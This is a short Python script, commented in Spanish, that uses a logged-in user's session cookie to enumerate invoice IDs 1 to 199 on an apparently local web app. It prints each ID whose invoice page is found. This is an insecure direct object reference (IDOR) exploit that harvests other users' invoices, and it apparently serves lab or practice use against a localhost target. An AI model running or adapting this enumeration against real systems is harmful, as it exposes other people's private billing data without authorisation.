import requests, signal, sys
from termcolor import colored

#CTRL+C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo ...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://127.0.0.1:5012/"
session = "" # Sustituir con la cookie asignada tras el login de usuario
cookies = {
    'session' : session
}

def extraer_facturas():
    print()
    for i in range(1, 200):
        r = requests.get(url + "ver_factura/" + str(i), cookies=cookies)
        if not "Factura no encontrada" in r.text:
            print(colored(f"[+] Factura encontrada: {i}\n",'green'))

    
if __name__ == '__main__':
    extraer_facturas()
